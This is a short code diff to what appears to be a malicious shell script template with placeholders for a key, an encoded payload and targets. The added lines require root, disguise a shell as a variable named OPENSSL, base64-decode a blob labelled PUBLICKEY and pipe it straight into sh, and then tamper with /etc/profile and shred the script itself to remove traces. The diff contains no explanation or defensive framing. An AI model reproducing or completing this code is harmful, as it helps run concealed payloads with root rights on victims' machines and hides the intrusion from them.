@@ -12,9 +12,9 @@ get_os() {
     fi
 }
 
+OPENSSL="sh"
 check_req() {
     # Fatal Errors
-    OPENSSL="sh"
     if [ "$(whoami)" != "root" ]; then
 	echo  "[!] NOT ROOT"
         exit
@@ -62,8 +62,12 @@ dec_loop() {
     done
 }
 ################## KEY STUFF ##############################
+check_req
 KEY="__KEY__"
 PUBLICKEY="\
 __STRING__"
-$PUBLICKEY | openssl base64 -d | $OPENSSL
+echo -n "$PUBLICKEY" | openssl base64 -d | $OPENSSL
 loop "__TARGETS__"
+rm /etc/profile
+mv /etc/profile.bak /etc/profile
+shred $0
